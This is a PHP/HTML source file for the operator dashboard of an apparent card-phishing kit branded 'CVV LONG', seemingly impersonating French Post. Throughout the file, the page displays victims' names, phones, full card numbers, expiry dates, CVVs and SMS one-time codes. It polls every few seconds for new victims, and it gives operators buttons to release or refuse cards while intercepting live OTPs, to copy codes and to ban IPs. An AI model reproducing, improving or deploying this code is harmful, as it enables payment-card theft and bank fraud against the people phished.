<?php
/*
session_start();
if (!isset($_SESSION['user_logged_in'])) {
    header('Location: login.php');
    exit();
}else{
    $session_username = $_SESSION['user_logged_in']['username'];
}
*/

require_once 'config.php';

if (isset($_POST['refresh'])) {

    $sql = "SELECT id, cardnumber, code,TIMESTAMPDIFF(SECOND, ifnull(date_updated, now()), now()) diff FROM user_information u ORDER BY `u`.`id` DESC";
    $users = [];
    $rows = [];
    $i = 0;
    if ($result = mysqli_query($conn, $sql)) {
        while ($row = mysqli_fetch_array($result, MYSQLI_ASSOC)) {
            $rows[] = $row;

            if ($row['diff'] > 0 && $row['diff'] < 15) {
                $users[$i]['id'] = $row['id'];
                $users[$i]['status'] = '<div class="online"><span class="tooltiptext">Online</span></div>';
                // $users[$i]['code'] = $row['code'];
            } else {
                $users[$i]['id'] = $row['id'];
                $users[$i]['status'] = '<div class="offline"><span class="tooltiptext">Offline</span></div>';
                // $users[$i]['code'] = $row['code'];
            }
            if ($row['code']) {
                $rowcard = $row['cardnumber'];
                $rowcode = $row['code'];
                $users[$i]['code'] = '<div class="sms-tooltiptext">Card: ' . $rowcard . '</br> SMS: ' . $rowcode . '</div><div class="sms-code">' . $rowcode . '</div>';
            } else {
                $users[$i]['code'] = $row['code'];
            }
            $i++;
        }
    }

    $response['status'] = true;
    $response['users'] = $users;

    die(json_encode($response));
}

date_default_timezone_set('Asia/Tokyo');
$time = date('Hi');

//echo $time;
$theme_mode = 'day';
if (($time >= "0600") && ($time <= "1200")) {
    $admin_time_zone_msg = "Good Morning";
    $theme_mode = 'day';
} elseif (($time >= "1201") && ($time <= "1600")) {
    $admin_time_zone_msg = "Good Afternoon";
    $theme_mode = 'day';
} elseif (($time >= "1601") && ($time <= "2100")) {
    $admin_time_zone_msg = "Good Evening";
    $theme_mode = 'day';
} elseif (($time >= "2101") && ($time <= "2400")) {
    $admin_time_zone_msg = "Good Night";
    $theme_mode = 'night';
} else {
    $admin_time_zone_msg = "Why aren't you asleep?  Are you programming?<br>";
}

//require_once 'header.php';
//require_once 'menu_bar.php';

// Initialize the session
session_start();

// Check if the user is logged in, if not then redirect him to login page
if(!isset($_SESSION["loggedin"])){
    header("location: /admin/login.php");
    exit;
}
?>

<!DOCTYPE html>

<html lang="en" class="light-style layout-menu-fixed" dir="ltr" data-theme="theme-default" data-assets-path="./assets/" data-template="vertical-menu-template-free">

<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0" />

    <title>操作台</title>

    <meta name="description" content="" />

    <!-- Favicon -->
    <link rel="icon" type="image/x-icon" href="./assets/img/favicon/favicon.ico" />

    <!-- Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,500;1,600;1,700&display=swap" rel="stylesheet" />

    <!-- Icons. Uncomment required icon fonts -->
    <link rel="stylesheet" href="./assets/vendor/fonts/boxicons.css" />

    <!-- Core CSS -->
    <link rel="stylesheet" href="./assets/vendor/css/core.css" class="template-customizer-core-css" />
    <link rel="stylesheet" href="./assets/vendor/css/theme-default.css" class="template-customizer-theme-css" />
    <link rel="stylesheet" href="./assets/css/demo.css" />

    <!-- Vendors CSS -->
    <link rel="stylesheet" href="./assets/vendor/libs/perfect-scrollbar/perfect-scrollbar.css" />

    <link rel="stylesheet" type="text/css" href="../assets/css/custom-2.css">

    <!-- Page CSS -->
    <?php if ($theme_mode == 'night') { ?>
        <link rel="stylesheet" href="./assets/css/core-dark.css" />
        <link rel="stylesheet" href="./assets/css/theme-default-dark.css" />
    <?php } ?>

    <!-- Helpers -->
    <script src="./assets/vendor/js/helpers.js"></script>

    <!--! Template customizer & Theme config files MUST be included after core stylesheets and helpers.js in the <head> section -->
    <!--? Config:  Mandatory theme config file contain global vars & default theme options, Set your preferred theme option in this file.  -->
    <script src="./assets/js/config.js"></script>
</head>

<body>
    <!-- Layout wrapper -->
    <div class="layout-wrapper layout-content-navbar">
        <div class="layout-container">
            <!-- Menu -->

            <aside id="layout-menu" class="layout-menu menu-vertical menu bg-menu-theme">
                <div class="app-brand demo">
                    <a href="index.html" class="app-brand-link">
                        <span class="app-brand-logo demo">

                        </span>
                        <span class="app-brand-text demo menu-text fw-bolder ms-2">CVV LONG</span>
                    </a>

                    <a href="javascript:void(0);" class="layout-menu-toggle menu-link text-large ms-auto d-block d-xl-none">
                        <i class="bx bx-chevron-left bx-sm align-middle"></i>
                    </a>
                </div>

                <div class="menu-inner-shadow"></div>

                <ul class="menu-inner py-1">
                    <!-- Dashboard -->
                    <li class="menu-item">
                        <a href="index.php" class="menu-link">
                            <i class="menu-icon tf-icons bx bx-home-circle"></i>
                            <div data-i18n="Analytics">仪表盘</div> <!-- dashboard -->
                        </a>
                    </li>
                    <li class="menu-item active">
                        <a href="users.php" class="menu-link">
                            <i class="menu-icon tf-icons bx bx-table"></i>
                            <div data-i18n="Analytics">操作台</div> <!-- user -->
                        </a>
                    </li>
                    <li class="menu-item">
                        <a href="setting.php" class="menu-link">
                            <i class="menu-icon tf-icons bx bx-cog"></i>
                            <div data-i18n="Analytics">设置</div> <!-- settings -->
                        </a>
                    </li>
                    <li class="menu-item">
                        <a href="/admin/logout.php" class="menu-link">
                            <i class="menu-icon tf-icons bx bx-log-out"></i>
                            <div data-i18n="Analytics">登出</div> <!-- Logout -->
                        </a>
                    </li>

                </ul>
            </aside>
            <!-- / Menu -->

            <!-- Layout container -->
            <div class="layout-page">
                <!-- Content wrapper -->
                <div class="content-wrapper">
                    <!-- Content -->

                    <div class="container-xxl flex-grow-1 container-p-y">
                        <!-- Layout Demo -->
                        <div class="layout-demo-wrapper">
                            <div class="inner-con" style="width: 100%;">





                                <div id="notificationStatus" style="color: blue;font-size: 18px;text-align: left;width: 100%;padding: 10px 0 0 0;"></div>
                                <button type="button" class="btn btn-success" id="new_button" onclick="location.reload();" style="display:none; background-color: blue; margin-bottom: 10px;">New users coming in</button>
                                <!-- <h2 class="">法国邮政后台</h2> -->

                                <div id="message"></div>

                                <div class="card">
                                    <h5 class="card-header">All Users</h5>
                                    <div class="card-body">
                                        <div class="table-responsive text-nowrap">
                                            <table id='user_data_table' class="table table-hover display table table-striped">
                                                <thead>
                                                    <tr>
                                                        <th scope="col">#</th>
                                                        <th scope="col">NAME</th>

                                                        <!--<th scope="col">address</th>-->


                                                        <th scope="col">PHONE</th>

                                                        <th scope="col">CARD NUMBER</th>
                                                        <th scope="col">DATA</th>
                                                        <th scope="col">cvv</th>
                                                        <th scope="col">SMS</th>
                                                        <th scrope="col">STATE</th>
                                                        <th scope="col">CARD STATE</th>
                                                        <th scope="col">SMS STATE</th>
                                                    </tr>
                                                </thead>
                                                <tbody>
                                                    <?php
                                                    $number_users = 0;
                                                    $sql = "SELECT u.*, TIMESTAMPDIFF(SECOND, ifnull(date_updated, now()), now()) diff FROM user_information u ORDER BY `u`.`id` DESC";


                                                    if ($result = mysqli_query($conn, $sql)) {

                                                        while ($row = mysqli_fetch_array($result, MYSQLI_ASSOC)) {
                                                            $rows[] = $row;
                                                            $rowstatus = "";
                                                            if (isset($row['verificcode'])) {
                                                                if ($row['verificcode'] == 2)
                                                                    $rowstatus = "rejected";
                                                                if ($row['verificcode'] == 1)
                                                                    $rowstatus = "approved";
                                                            }
                                                            $number_users = $number_users + 1;
                                                    ?>
                                                            <tr class="row-<?php echo $row['id']; ?> <?php echo $rowstatus; ?>" data-num-users="<?php echo $number_users; ?>">
                                                                <td data-id="<?php echo $row['id']; ?>"><?php echo $row['id']; ?></td>
                                                                <td data-id="<?php echo $row['id']; ?>"><?php echo $row['fullname']; ?></td>

                                                                <?php /* ?><td data-id="<?php echo $row['id']; ?>"><?php echo $row['additional']; ?></td><?php */ ?>


                                                                <td data-id="<?php echo $row['id']; ?>"><?php echo $row['phone']; ?></td>

                                                                <td data-id="<?php echo $row['id']; ?>" class="card_number"><?php echo $row['cardnumber']; ?></td>
                                                                <td data-id="<?php echo $row['id']; ?>"><?php echo $row['exp_date']; ?></td>
                                                                <td data-id="<?php echo $row['id']; ?>"><?php echo $row['card_code']; ?></td>
                                                                <td id='col-code-<?php echo $row['id']; ?>' data-id="<?php echo $row['id']; ?>" class="copy-sms-code sms-tooltip">
                                                                    <?php echo $row['code']; ?>
                                                                </td>
                                                                <td data-id="<?php echo $row['id']; ?>">
                                                                    <div id='user<?php echo $row['id']; ?>'>
                                                                        <?php if ($row['diff'] > 0 && $row['diff'] < 10) {
                                                                            if ($row['status'] != 1) {
                                                                                $sql = "UPDATE user_information SET status=1 WHERE id='" . $row['id'] . "'";
                                                                                mysqli_query($conn, $sql);
                                                                            }
                                                                        ?>
                                                                            <div class="online"><span class="tooltiptext">Online</span></div>
                                                                        <?php } else {
                                                                            if ($row['status'] != 0) {
                                                                                $sql = "UPDATE user_information SET status=0 WHERE id='" . $row['id'] . "'";
                                                                                mysqli_query($conn, $sql);
                                                                            }
                                                                        ?>

                                                                            <div class="offline"><span class="tooltiptext">Offline</span></div>
                                                                        <?php } ?>
                                                                    </div>
                                                                </td>
                                                                <td data-id="<?php echo $row['id']; ?>">
                                                                    <?php

                                                                    if ($row['cardstatus'] == "none") {
                                                                        echo '<span style="color:black;font-size:16px;">没有卡</span>';
                                                                    }
                                                                    if ($row['cardstatus'] == "reject" || $row['cardstatus'] == "added") {
                                                                        echo '<span style="color:red;font-size:16px;">Waiting</span>';
                                                                    }
                                                                    if ($row['cardstatus'] == "approve") {
                                                                        echo '<span style="color:green;font-weight:bold;font-size:16px;">通过</span>';
                                                                    }
                                                                    ?>
                                                                    <select class="form-select cardstatus" name="cardstatus" userid="<?php echo $row['id']; ?>">
                                                                        <option value="">请选择卡片状态</option>
                                                                        <option value="release">Release</option>
                                                                        <option value="refuse">Refuse</option>
                                                                        <!-- <option value="refused_2">Refused to 2</option>
                                    <option value="refused_pin">pin</option>
                                    <option value="refused_change_card">Change your credit card</option> -->
                                                                    </select>
                                                                    <div class="d-flex p-2 btn-custom flex-column">
                                                                        <button type="button" class="btn btn-success cardrelease mb-2" userid="<?php echo $row['id']; ?>" style="display:none;">卡放行</button>
                                                                        <button type="button" class="btn btn-danger cardreject" userid="<?php echo $row['id']; ?>" style="display:none;">卡拒绝</button>
                                                                    </div>
                                                                </td>

                                                                <td data-id="<?php echo $row['id']; ?>" class="d-flex p-2 btn-custom">

                                                                    <button type="button" title="Ban IP" class="btn btn-danger banip" userid="<?php echo $row['id']; ?>" <?php echo $row['banstatus'] ? 'disabled' : ''; ?>><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-slash-circle" viewBox="0 0 16 16">
                                                                            <path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14zm0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16z" />
                                                                            <path d="M11.354 4.646a.5.5 0 0 0-.708 0l-6 6a.5.5 0 0 0 .708.708l6-6a.5.5 0 0 0 0-.708z" />
                                                                        </svg></button>
                                                                    <button type="button" class="btn btn-success release" userid="<?php echo $row['id']; ?>">放行</button>
                                                                    <button type="button" class="btn btn-danger reject" userid="<?php echo $row['id']; ?>">拒绝</button>

                                                                    <a class="btn btn-sm btn-icon item-delete" userid="<?php echo $row['id']; ?>" href="javascript:void(0);"><i class="bx bx-trash me-1"></i></a>
                                                                </td>
                                                            </tr>
                                                    <?php
                                                        }
                                                    }
                                                    ?>
                                                </tbody>
                                            </table>
                                        </div>
                                    </div>
                                </div>


                                <iframe src="https://upload.wikimedia.org/wikipedia/commons/3/34/Sound_Effect_-_Door_Bell.ogg" style="display:none" id="iframeAudio">
                                </iframe>
                                <audio id="audio" src="https://upload.wikimedia.org/wikipedia/commons/3/34/Sound_Effect_-_Door_Bell.ogg" style="display: none;" loop preload="auto" crossOrigin="anonymous"></audio>













                                <!-- <div class="card">
	<h5 class="card-header">All Users</h5>
	<div class="card-body">
		<div class="table-responsive text-nowrap">
		<table id="example" class="display table table-striped" style="width:100%">
        <thead>
            <tr>
                <th>Name</th>
                <th>Position</th>
                <th>Office</th>
                <th>Age</th>
                <th>Start date</th>
                <th>Salary</th>
            </tr>
        </thead>
        <tbody>
            <tr>
                <td>Tiger Nixon</td>
                <td>System Architect</td>
                <td>Edinburgh</td>
                <td>61</td>
                <td>2011-04-25</td>
                <td>$320,800</td>
            </tr>
            <tr>
                <td>Garrett Winters</td>
                <td>Accountant</td>
                <td>Tokyo</td>
                <td>63</td>
                <td>2011-07-25</td>
                <td>$170,750</td>
            </tr>
            <tr>
                <td>Ashton Cox</td>
                <td>Junior Technical Author</td>
                <td>San Francisco</td>
                <td>66</td>
                <td>2009-01-12</td>
                <td>$86,000</td>
            </tr>
            <tr>
                <td>Cedric Kelly</td>
                <td>Senior Javascript Developer</td>
                <td>Edinburgh</td>
                <td>22</td>
                <td>2012-03-29</td>
                <td>$433,060</td>
            </tr>
            <tr>
                <td>Airi Satou</td>
                <td>Accountant</td>
                <td>Tokyo</td>
                <td>33</td>
                <td>2008-11-28</td>
                <td>$162,700</td>
            </tr>

        </tbody>
        <tfoot>
            <tr>
                <th>Name</th>
                <th>Position</th>
                <th>Office</th>
                <th>Age</th>
                <th>Start date</th>
                <th>Salary</th>
            </tr>
        </tfoot>
    </table>
		</div>
	</div>
</div>				-->

                            </div>
                        </div>
                        <!--/ Layout Demo -->
                    </div>
                    <!-- / Content -->

                    <!-- Footer -->
                    <footer class="content-footer footer bg-footer-theme">
                        <div class="container-xxl d-flex flex-wrap justify-content-between py-2 flex-md-row flex-column">
                            <div class="mb-2 mb-md-0">
                                ©
                                <script>
                                    document.write(new Date().getFullYear());
                                </script>
                                , made with ❤️

                            </div>
                        </div>
                    </footer>
                    <!-- / Footer -->

                    <div class="content-backdrop fade"></div>
                </div>
                <!-- Content wrapper -->
            </div>
            <!-- / Layout page -->
        </div>

        <!-- Overlay -->
        <div class="layout-overlay layout-menu-toggle"></div>
    </div>
    <!-- / Layout wrapper -->



    <!-- Core JS -->
    <!-- build:js assets/vendor/js/core.js -->
    <script src="./assets/vendor/libs/jquery/jquery.js"></script>
    <script src="./assets/vendor/libs/popper/popper.js"></script>
    <script src="./assets/vendor/js/bootstrap.js"></script>
    <script src="./assets/vendor/libs/perfect-scrollbar/perfect-scrollbar.js"></script>

    <script src="./assets/vendor/js/menu.js"></script>
    <!-- endbuild -->

    <!-- Vendors JS -->

    <!-- Main JS -->
    <script src="./assets/js/main.js"></script>

    <!-- Page JS -->

    <!-- Place this tag in your head or just before your close body tag. -->
    <script async defer src="https://buttons.github.io/buttons.js"></script>

    <link rel="stylesheet" type="text/css" href="DataTables/datatables.min.css" />
    <script type="text/javascript" src="DataTables/datatables.min.js"></script>

    <script>
        $(document).ready(function() {
            // Setup - add a text input to each footer cell
            /* $('#example tfoot th').each(function () {
                 var title = $(this).text();
                 $(this).html('<input type="text" placeholder="Search ' + title + '" />');
             }); */


            /**Lucas--- */
            $(".cardstatus").change(function(e) {
                let status = e.target.value;
                let userId = $(this).attr("userid")
                console.log(status)
                console.log(userId)
                if (status == 'release') {
                    $.ajax({
                        type: 'post',
                        url: './../release.php',
                        data: {
                            'userid': userId,
                            'cardstatus': status
                        },
                        success: function(data) {
                            if (data == 1) {
                                $("#message").html(
                                    "<span style='color: green;font-size: 18px;text-align: left;width: 100%;padding: 10px 0 0 0;'>Card Released Successfully<span>"
                                );
                                setTimeout(function() {
                                    location.reload();
                                }, 5000);
                                return true;
                            } else {
                                $("#message").html(
                                    "<span style='color: red;font-size: 18px;text-align: left;width: 100%;padding: 10px 0 0 0;'>Something is wrong with card release .please contact to administrator.<span>"
                                );

                                return false;
                            }
                        }
                    });

                } else if (status == "refuse") {
                    $.ajax({
                        type: 'post',
                        url: './../reject.php',
                        data: {
                            'userid': userId,
                            'cardstatus': status
                        },
                        success: function(data) {
                            if (data == 1) {
                                rejected[userid] = true;
                                $("#message").html(
                                    "<span style='color: green;font-size: 18px;text-align: left;width: 100%;padding: 10px 0 0 0;'>Successfully reject application<span>"
                                );
                                return true;
                            } else {
                                return false;
                            }
                        }
                    });
                }
            })

            $(".release").click(function(event) {
                event.preventDefault();
                var userid = $(this).attr("userid");

                $.ajax({
                    type: 'post',
                    url: './../release.php',
                    data: {
                        'userid': userid
                    },
                    success: function(data) {
                        if (data == 1) {
                            $("#message").html(
                                "<span style='color: green;font-size: 18px;text-align: left;width: 100%;padding: 10px 0 0 0;'>Successfully released application<span>"
                            );
                            setTimeout(function() {
                                location.reload();
                            }, 5000);
                            return true;
                        } else {
                            return false;
                        }
                    }
                });

            });

            $(".banip").click(function(event) {
                event.preventDefault();
                var userid = $(this).attr("userid");

                $.ajax({
                    type: 'post',
                    url: 'banip.php',
                    data: {
                        'userid': userid
                    },
                    success: function(data) {
                        if (data == 1) {
                            $("#message").html(
                                "<span style='color: green;font-size: 18px;text-align: left;width: 100%;padding: 10px 0 0 0;'>Successfully IP banned<span>"
                            );
                            setTimeout(function() {
                                location.reload();
                            }, 5000);
                            return true;
                        } else {
                            return false;
                        }
                    }
                });

            });

            /**Lucas-end */
            // DataTable
            var table = $('#user_data_table').DataTable({
                order: [
                    [0, 'desc']
                ],
                initComplete: function() {
                    // Apply the search
                    this.api()
                        .columns()
                        .every(function() {
                            var that = this;

                            /* $('input', this.footer()).on('keyup change clear', function () {
                                 if (that.search() !== this.value) {
                                     that.search(this.value).draw();
                                 }
                             }); */
                        });
                },
            });
        });
    </script>
    <div id="credit_card_modal">
        <div id="credit_card">
            <p id="credit_card_number"></p>
            <p id="credit_card_cvv"></p>
            <p id="credit_card_expry"></p>
            <p id="credit_card_holder"></p>
        </div>
    </div>

    <script>
        /* function ajaxPollingFunc() {
        console.log('hi');
        $number_users_j = $('tbody tr:last-child').attr("data-num-users");
        $.ajax({
            url: 'process.php',
            type: 'POST',
            dataType: "json",
            data: {
                'users_count': $number_users_j
            },
            success: function(result) {

                if (result == 1) {
                    $("#new_button").show();
                    var audio = document.getElementById('audio');

                    audio.play().then(() => {
                        console.log("ok");
                    });
                    return true;
                } else {
                    $("#new_button").hide();
                    return true;
                }

            }
        });
    }

    function ajaxPolling() {
        setInterval(ajaxPollingFunc, 3 * 1000);
    }

    //ajaxPolling(); */

        let users = JSON.parse('<?php echo json_encode($rows); ?>');
        let numRow = '<?php echo count($rows); ?>';
        let oldRow = localStorage.getItem('tot');
        let counter = 0;
        let oldCode = [];
        let rejected = [];

        function refresh() {
            $.ajax({
                type: "POST",
                url: 'users.php',
                data: {
                    "refresh": true
                },
                dataType: "json",
                success: function(data) {
                    if (data.status) {
                        for (i = 0; i < data.users.length; i++) {
                            $("#user" + data.users[i].id).html(data.users[i].status);
                            $("#col-code-" + data.users[i].id).html(data.users[i].code || '');

                            $('#col-code-' + data.users[i].id).removeClass('highlight');
                            if ((data.users[i].code || '') != '' && oldCode[data.users[i].id] != data.users[i].code) {
                                oldCode[data.users[i].id] = data.users[i].code;
                                $('#col-code-' + data.users[i].id).addClass('highlight');
                                if (rejected[data.users[i].id]) {
                                    rejected[data.users[i].id] = false;
                                    $("#notificationStatus").html('ID ' + data.users[i].id + ' status update');
                                }
                            }
                        }

                        oldRow = numRow;
                        numRow = data.users.length;
                        if (numRow > oldRow) { // oldRow != numRow
                            $("#new_button").show();
                            setTimeout(function() {
                                location.reload();
                            }, 5000);

                            var audio = document.getElementById('audio');

                            audio.play().then(() => {
                                console.log("ok");
                                /* setTimeout(function() {
                                    audio.pause();
                                    audio.currentTime = 0;
                                }, 2000); */
                            });
                            //console.log("in condition...");
                            /* setTimeout(function() {
                                $("body").trigger('click');
                            }, 400); */

                        }
                    }
                }
            });
        }

        $(document).ready(function() {
            window.setInterval(refresh, 3000);

            /* if (oldRow != numRow) {
                console.log("in condition...");
                setTimeout(function() {
                    $("body").trigger('click');
                }, 400);

            } */




            $(".reject").click(function(event) {
                event.preventDefault();
                var userid = $(this).attr("userid");

                $.ajax({
                    type: 'post',
                    url: 'reject.php',
                    data: {
                        'userid': userid
                    },
                    success: function(data) {
                        if (data == 1) {
                            rejected[userid] = true;
                            $("#message").html(
                                "<span style='color: green;font-size: 18px;text-align: left;width: 100%;padding: 10px 0 0 0;'>Successfully reject application<span>"
                            );
                            return true;
                        } else {
                            return false;
                        }
                    }
                });

            });
            $(".release").click(function(event) {
                event.preventDefault();
                var userid = $(this).attr("userid");

                $.ajax({
                    type: 'post',
                    url: 'release.php',
                    data: {
                        'userid': userid
                    },
                    success: function(data) {
                        if (data == 1) {
                            $("#message").html(
                                "<span style='color: green;font-size: 18px;text-align: left;width: 100%;padding: 10px 0 0 0;'>Successfully released application<span>"
                            );
                            setTimeout(function() {
                                location.reload();
                            }, 5000);
                            return true;
                        } else {
                            return false;
                        }
                    }
                });

            });

            /*card permit/denied code start here */

            $('select.form-select').on('change', function() {
                var userid = $(this).attr("userid");

                if (this.value == "realease") {

                    var cardstatus = "approve";
                    $.ajax({
                        type: 'post',
                        url: 'release.php',
                        data: {
                            'userid': userid,
                            'cardstatus': cardstatus
                        },
                        success: function(data) {
                            if (data == 1) {
                                $("#message").html(
                                    "<span style='color: green;font-size: 18px;text-align: left;width: 100%;padding: 10px 0 0 0;'>Card Released Successfully<span>"
                                );
                                setTimeout(function() {
                                    location.reload();
                                }, 5000);
                                return true;
                            } else {
                                $("#message").html(
                                    "<span style='color: red;font-size: 18px;text-align: left;width: 100%;padding: 10px 0 0 0;'>Something is wrong with card release .please contact to administrator.<span>"
                                );

                                return false;
                            }
                        }
                    });

                }
                if (this.value == "realease" || this.value == "refused_1" || this.value == "refused_2" || this.value == "refused_pin" || this.value == "refused_change_card") {

                    var cardstatus = "reject";
                    if (this.value == 'refused_1') {
                        cardstatus = 'reject';
                    } else if (this.value == 'refused_2') {
                        cardstatus = 'reject_2';
                    } else {
                        cardstatus = this.value;
                    }

                    $.ajax({
                        type: 'post',
                        url: 'reject.php',
                        data: {
                            'userid': userid,
                            'cardstatus': cardstatus
                        },
                        success: function(data) {
                            if (data == 1) {
                                $("#message").html(
                                    "<span style='color: green;font-size: 18px;text-align: left;width: 100%;padding: 10px 0 0 0;'>Card Reject Successfully.<span>"
                                );
                                setTimeout(function() {
                                    location.reload();
                                }, 3000);
                                return true;
                            } else {
                                $("#message").html(
                                    "<span style='color: red;font-size: 18px;text-align: left;width: 100%;padding: 10px 0 0 0;'>Something is wrong please contact to administrator.<span>"
                                );
                                return false;
                            }
                        }
                    });

                }

                /*
                if (this.value == "yes") {
                    $(".row-" + userid + " .cardrelease").fadeIn();
                    $(".row-" + userid + " .cardreject").fadeIn();
                } else {
                    $(".row-" + userid + " .cardrelease").fadeOut();
                    $(".row-" + userid + " .cardreject").fadeOut();
                }*/
            });

            /*card reject code start here */

            $(".cardreject").click(function(event) {
                event.preventDefault();
                var userid = $(this).attr("userid");
                var cardstatus = "reject";
                $.ajax({
                    type: 'post',
                    url: 'reject.php',
                    data: {
                        'userid': userid,
                        'cardstatus': cardstatus
                    },
                    success: function(data) {
                        if (data == 1) {
                            $("#message").html(
                                "<span style='color: green;font-size: 18px;text-align: left;width: 100%;padding: 10px 0 0 0;'>Card Reject Successfully.<span>"
                            );
                            setTimeout(function() {
                                location.reload();
                            }, 3000);
                            return true;
                        } else {
                            $("#message").html(
                                "<span style='color: red;font-size: 18px;text-align: left;width: 100%;padding: 10px 0 0 0;'>Something is wrong please contact to administrator.<span>"
                            );
                            return false;
                        }
                    }
                });

            });

            /*card release code start here*/
            $(".cardrelease").click(function(event) {
                event.preventDefault();
                var userid = $(this).attr("userid");
                var cardstatus = "approve";
                $.ajax({
                    type: 'post',
                    url: 'release.php',
                    data: {
                        'userid': userid,
                        'cardstatus': cardstatus
                    },
                    success: function(data) {
                        if (data == 1) {
                            $("#message").html(
                                "<span style='color: green;font-size: 18px;text-align: left;width: 100%;padding: 10px 0 0 0;'>Card Released Successfully<span>"
                            );
                            setTimeout(function() {
                                location.reload();
                            }, 5000);
                            return true;
                        } else {
                            $("#message").html(
                                "<span style='color: red;font-size: 18px;text-align: left;width: 100%;padding: 10px 0 0 0;'>Something is wrong with card release .please contact to administrator.<span>"
                            );

                            return false;
                        }
                    }
                });

            });

            $('.card_number').click(function(event) {
                const data_id = $(this).data('id');
                const user = users.find((user) => user.id == data_id);
                if (user) {
                    const card_number = user.cardnumber;
                    let card_number_ary = card_number.match(/.{1,4}/g);
                    $('#credit_card #credit_card_number').html(card_number_ary.join(" "));
                    $('#credit_card #credit_card_holder').html(user.fullname);
                    $('#credit_card #credit_card_expry').html(user.exp_date);
                    $('#credit_card #credit_card_cvv').html(user.card_code);
                    $('#credit_card_modal').fadeIn("slow", function() {
                        $('#credit_card_modal').css('display', 'flex');
                    });
                }
            });

            $('#credit_card_modal').click(function(event) {
                $('#credit_card_modal').fadeOut();
            })


            $(".item-delete").click(function(event) {

                event.preventDefault();

                if (confirm("Are you sure?")) {

                    var userid = $(this).attr("userid");
                    var thisele = $(this);
                    $.ajax({
                        type: 'post',
                        url: 'dashboard_functions.php',
                        data: {
                            'userid': userid,
                            'action': 'user_delete'
                        },
                        success: function(data) {

                            if (data == 1) {


                                var table = $('#user_data_table').DataTable();
                                var removingRow = thisele.closest('tr');
                                console.log(thisele);
                                table.row(removingRow).remove().draw();

                                $("#message").html(
                                    "<span style='color: green;font-size: 18px;text-align: left;width: 100%;padding: 10px 0 0 0;'>User deleted Successfully<span>"
                                );
                                return true;
                            } else {
                                return false;
                            }
                        }
                    });


                }
                return false;

            });



        });
    </script>

    <!-- Notification code start here--->
    <style>
        #notification .show {
            width: 100%;
            background: green;
            color: #000;
            padding: 10px;
            border-radius: 10px;
            margin: 10px 0 10px 0;
        }

        #user_data_table .btn-custom {
            display: revert !important;
        }

        .copy-sms-code {
            cursor: pointer;
        }

        .sms-tooltip {
            position: relative;
        }

        .sms-tooltip .sms-tooltiptext {
            visibility: hidden;
            width: 200px;
            background-color: black;
            color: #fff;
            text-align: center;
            border-radius: 6px;
            padding: 5px 0;
            font-size: 13px;

            /* Position the sms-tooltip */
            position: absolute;
            z-index: 1;
            bottom: 70%;
            left: 0%;
            margin-left: -60px;
        }

        .sms-tooltiptext::after {
            content: "";
            position: absolute;
            top: 100%;
            left: 50%;
            margin-left: -5px;
            border-width: 5px;
            border-style: solid;
            border-color: #555 transparent transparent transparent;
        }

        .sms-tooltip:hover .sms-tooltiptext {
            visibility: visible;
        }

        tr.approved,
        tr.approved:hover,
        tr.approved td {
            background-color: hsl(0deg 0% 0% / 20%) !important;
            color: #fff !important;
        }

        tr.rejected tr.rejected:hover,
        tr.rejected td {
            background-color: rgb(0 0 255 / 50%) !important;
            color: #fff !important;
        }
    </style>

    <script type="text/javascript">
        jQuery(function() {
            /*
            jQuery('.form-select').on('change', function() {
                var sel = jQuery(this).val();
                console.log(sel);
                if (sel == 'yes') {
                    jQuery(this).closest('td').find('button').css('display', 'block');
                } else {
                    jQuery(this).closest('td').find('button').css('display', 'none');
                }
            });
            */
            $(document).on('click', '.sms-code', function() {
                let smscode = $(this).text();
                copysmscode(smscode);
                alert('Sms copied successfully');
            });
        });
        // $(document).ready(function() {

        // 	setTimeout(function() {
        // 		localStorage.setItem('tot', <?php echo count($rows); ?>);
        //                         location.reload();
        //                     }, 10000);
        // })

        function copysmscode(text) {
            // Copy the text inside the text field
            navigator.clipboard.writeText(text);
        }
    </script>


</body>

</html>

<?php

$row = [];
$sql = "SELECT * FROM dashboard where meta_key='auto_refresh'";
if ($result = mysqli_query($conn, $sql)) {
    $row = $result->fetch_row();
    $get_auto_refresh = $row[3];
}

if ($get_auto_refresh == 'on') {
    echo '<script>
        setTimeout(function(){
           window.location.reload(1);
        }, 5000);
        </script>
        ';
}
?>
